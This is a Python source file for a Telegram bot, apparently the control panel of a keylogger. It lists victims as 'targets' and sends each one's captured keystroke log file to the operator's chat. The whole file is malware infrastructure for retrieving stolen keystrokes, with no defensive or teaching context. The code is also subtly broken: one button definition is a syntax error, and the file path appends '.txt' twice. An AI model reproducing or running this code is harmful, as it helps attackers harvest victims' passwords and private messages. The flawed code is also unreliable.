import os
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

class KeyloggerBot:
    def __init__(self, name, api_hash, api_id, bot_token):
        self.app = Client(name=name, api_hash=api_hash, api_id=api_id, bot_token=bot_token)
        self.setup_handlers()

    def setup_handlers(self):
        @self.app.on_message(filters=filters.regex("/start"))
        async def __StartCommand__(client, message):
            await self.app.send_message(
                chat_id=message.chat.id,
                text="KeyLogger Bot Panel!. 📋",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Target Lists" 💻, "target_list")]]
                )
            )

        @self.app.on_callback_query(filters=filters.regex("target_list"))
        async def __ShowTargetList__(client, query):
            buttons = [
                InlineKeyboardButton(text=name.replace(".txt", ""), callback_data=name)
                for name in os.listdir("data/")
            ]
            button_rows = [buttons[i:i + 3] for i in range(0, len(buttons), 3)]
            await query.edit_message_text("Target Lists", reply_markup=InlineKeyboardMarkup(button_rows))

        @self.app.on_callback_query()
        async def __SelectTarget__(client, query):
            await self.app.send_document(
                chat_id=query.message.chat.id,
                document=f"data/{query.data}.txt",
                caption=f"Logs Target: {query.data}"
            )

    def run(self):
        self.app.run()

if __name__ == "__main__":
    bot = KeyloggerBot(name="Keylogger", api_hash='', api_id='', bot_token='')
    bot.run()

